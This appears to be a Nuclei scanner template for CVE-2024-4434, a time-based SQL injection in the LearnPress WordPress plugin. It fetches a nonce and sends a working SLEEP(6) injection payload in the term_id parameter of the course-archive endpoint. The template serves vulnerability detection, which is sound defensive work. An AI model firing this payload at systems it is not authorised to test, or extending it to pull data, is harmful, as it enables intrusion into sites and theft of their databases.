http:
- extractors:
  - group: 1
    internal: true
    name: nonce
    part: body
    regex:
    - '"nonce":"([a-z0-9]+)","is_course_archive"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - duration_2 >= 6
    - status_code_2 == 200
    - contains(content_type,"application/json")
    - contains_all(body_2,"No courses were found","success")
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  - '@timeout 20s

    POST /wp-json/lp/v1/courses/archive-course?term_id={{num}})+OR+SLEEP(6)+--+A HTTP/1.1

    Host: {{Hostname}}

    X-WP-Nonce: {{nonce}}

    '
id: CVE-2024-4434
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:a:thimpress:learnpress:*:*:*:*:wordpress:*:*:*
    cve-id: CVE-2024-4434
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.98915
    epss-score: 0.7709
  description: "The LearnPress WordPress LMS Plugin plugin for WordPress is vulnerable\
    \ to time-based SQL Injection via the \u2018term_id\u2019 parameter in versions\
    \ up to, and including, 4.2.6.5 due to insufficient escaping on the user supplied\
    \ parameter and lack of sufficient preparation on the existing SQL query. This\
    \ makes it possible for unauthenticated attackers to append additional SQL queries\
    \ into already existing queries that can be used to extract sensitive information\
    \ from the database.\n"
  impact: 'Unauthenticated attackers can execute time-based SQL injection to extract
    sensitive database information.

    '
  metadata:
    max-request: 2
    product: learnpress
    publicwww-query: /wp-content/plugins/learnpress
    vendor: thimpress
    verified: true
  name: LearnPress WordPress LMS Plugin <= 4.2.6.5 - SQL Injection
  reference:
  - https://inky-knuckle-2c2.notion.site/Unauthenticated-SQLI-in-Learnpress-plugin-Version-4-2-6-5-a86fe63bcc7b4c9988802688211817fd
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/learnpress/learnpress-wordpress-lms-plugin-4265-unauthenticated-time-based-sql-injection
  - https://nvd.nist.gov/vuln/detail/CVE-2024-4434
  remediation: 'Update LearnPress to version 4.2.6.6 or later.

    '
  severity: critical
  tags: cve,cve2024,wp,wp-plugin,wordpress,sqli,learnpress,vkev,vuln
variables:
  num: '{{rand_int(10000, 99999)}}'
